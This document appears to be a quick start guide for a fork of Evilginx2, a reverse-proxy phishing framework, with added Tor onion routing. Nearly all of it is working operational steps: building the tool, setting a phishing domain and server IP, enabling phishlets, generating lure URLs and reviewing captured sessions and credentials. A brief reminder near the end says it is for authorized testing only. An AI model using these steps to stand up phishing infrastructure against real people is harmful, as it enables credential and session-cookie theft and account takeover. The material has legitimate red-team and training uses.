# Evilginx2 Quick Start Guide

Get up and running with Evilginx2 in minutes, including v3 Onion address support.

## 5-Minute Setup

### 1. Install Dependencies

**Ubuntu/Debian:**
```bash
sudo apt-get update
sudo apt-get install -y git golang-go tor
```

**macOS:**
```bash
brew install git go tor
```

### 2. Clone and Build

```bash
git clone https://github.com/bitbybit91/evilginx2.git
cd evilginx2
go build -o evilginx main.go
```

### 3. Start Tor (for Onion Support)

**Linux:**
```bash
sudo systemctl start tor
sudo systemctl enable tor
```

**macOS:**
```bash
brew services start tor
```

### 4. Run Evilginx2

```bash
./evilginx -p ./phishlets
```

You should see the Evilginx banner and prompt.

## Basic Configuration

In the Evilginx2 terminal:

```bash
# Set your domain (replace with your actual domain)
config domain example.com

# Set your server IP (replace with your actual IP)
config ip 1.2.3.4

# Enable Tor proxy for .onion support
proxy socks5h 127.0.0.1 9050
proxy on
```

## Test with Example Phishlet

```bash
# Configure the example phishlet
phishlets hostname example academy.example.com

# Enable it
phishlets enable example

# Create a lure
lures create example

# Get the lure URL
lures get-url 0
```

Visit the lure URL in a browser to test!

## Working with Onion Services

### Quick Setup for .onion Addresses

1. **Verify Tor is running:**
```bash
systemctl status tor
# or
netstat -tlnp | grep 9050
```

2. **Configure Evilginx to use Tor:**
```bash
# In Evilginx terminal
proxy socks5h 127.0.0.1 9050
proxy on
```

3. **Use an onion phishlet:**
```bash
# Edit phishlets/onion-example.yaml with actual onion address
# Then configure it
phishlets hostname onion-example secure.example.com
phishlets enable onion-example
```

## Common Commands

| Command | Description |
|---------|-------------|
| `config domain <domain>` | Set phishing domain |
| `config ip <ip>` | Set server IP |
| `phishlets` | List all phishlets |
| `phishlets enable <name>` | Enable a phishlet |
| `lures` | List all lures |
| `lures create <phishlet>` | Create new lure |
| `sessions` | View captured sessions |
| `proxy socks5h 127.0.0.1 9050` | Configure Tor proxy |
| `proxy on` | Enable proxy |
| `help` | Show help |
| `quit` | Exit |

## Next Steps

- 📖 Read the **[Complete Installation Guide](INSTALL.md)** for detailed setup
- 📚 Check the **[Commands Reference](COMMANDS.md)** for all commands
- 🎨 Learn to **[Create Custom Phishlets](CUSTOMIZATION.md)**
- 🔒 Review security best practices in the documentation

## Quick Troubleshooting

### "permission denied" on ports 80/443

Run with sudo or grant capability:
```bash
sudo ./evilginx -p ./phishlets
# OR
sudo setcap 'cap_net_bind_service=+ep' ./evilginx
```

### Phishlet not loading

Check the phishlets directory:
```bash
./evilginx -p /path/to/phishlets
```

### Tor connection fails

Verify Tor is running and listening:
```bash
systemctl status tor
netstat -tlnp | grep 9050
```

Test Tor connection:
```bash
curl --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/
```

## Example Workflow

Here's a complete example from start to finish:

```bash
# 1. Start Evilginx
./evilginx -p ./phishlets

# 2. Configure server
config domain phish.example.com
config ip 203.0.113.10

# 3. Enable Tor
proxy socks5h 127.0.0.1 9050
proxy on

# 4. Set up phishlet
phishlets hostname example login.phish.example.com
phishlets enable example

# 5. Create and get lure
lures create example
lures get-url 0

# 6. Monitor sessions
sessions

# 7. View captured data
sessions 0
```

## Tips for Success

✅ **Do:**
- Test in a controlled environment first
- Use developer mode for testing: `./evilginx -developer`
- Enable debug output: `./evilginx -debug`
- Keep documentation handy

❌ **Don't:**
- Use without authorization
- Commit sensitive data to git
- Expose your phishing server publicly without proper security
- Forget to secure your server with a firewall

## Security Reminder

⚠️ **Important:** Evilginx2 is for authorized penetration testing only. Always:
- Get written permission before testing
- Secure your infrastructure
- Follow responsible disclosure
- Comply with local laws

## Getting Help

- 📖 **[Installation Guide](INSTALL.md)** - Detailed setup instructions
- 📚 **[Commands Guide](COMMANDS.md)** - All commands explained
- 🎨 **[Customization Guide](CUSTOMIZATION.md)** - Create phishlets
- 🌐 **[Official Docs](https://help.evilginx.com)** - Online documentation
- 🐛 **[GitHub Issues](https://github.com/bitbybit91/evilginx2/issues)** - Report bugs

---

**Ready to dive deeper?** Check out the full documentation!

- [INSTALL.md](INSTALL.md) - Complete installation guide
- [COMMANDS.md](COMMANDS.md) - Detailed command reference  
- [CUSTOMIZATION.md](CUSTOMIZATION.md) - Create custom phishlets
